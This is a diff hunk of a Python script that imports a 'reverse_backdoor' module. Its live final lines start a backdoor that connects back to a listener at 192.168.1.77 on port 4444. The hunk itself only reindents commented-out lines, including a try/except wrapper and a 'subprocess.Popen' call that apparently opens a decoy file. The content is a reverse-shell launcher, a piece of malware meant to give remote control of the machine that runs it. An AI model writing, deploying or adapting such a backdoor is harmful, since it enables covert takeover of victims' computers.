@@ -5,10 +5,10 @@ import reverse_backdoor, subprocess, sys
 # subprocess.Popen(file_name, shell=True)
 
 #try:
- #   my_backdoor = reverse_backdoor.Backdoor("192.168.1.77", 4444)
-  #  my_backdoor.run()
+#    my_backdoor = reverse_backdoor.Backdoor("192.168.1.77", 4444)
+#    my_backdoor.run()
 #except Exception:
- #   sys.exit()
+#    sys.exit()
 
 my_backdoor = reverse_backdoor.Backdoor("192.168.1.77", 4444)
 my_backdoor.run()		
